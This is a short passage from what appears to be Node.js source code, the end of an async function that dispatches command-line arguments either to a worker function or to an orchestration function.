    await smallWorker(process.argv[3], Number(process.argv[4]), process.argv[5]);
  } else {
    await orchestrate(process.argv.slice(2));
  }
}
